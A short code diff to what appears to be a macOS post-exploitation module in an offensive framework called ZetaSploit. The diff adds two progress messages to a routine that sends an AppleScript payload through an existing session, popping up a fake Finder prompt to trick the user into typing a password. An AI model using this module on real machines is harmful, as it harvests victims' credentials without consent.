@@ -58,6 +58,7 @@ class ZetaSploitModule:
     def run(self):
         exists, controller = self.session.get_session(self.parser.parse_options(self.options))
         if exists:
+            self.badges.output_process("Waiting for prompt window to appear...")
             payload = """
             tell application "Finder"
                 activate
@@ -76,6 +77,7 @@ class ZetaSploitModule:
                 end try
             end tell
             """
+            self.badges.output_process("Waiting for user to type password...")
             status, output = controller.send_command("osascript", payload)
             if status == "error":
                 self.badges.output_error("Failed to prompt user to type password!")
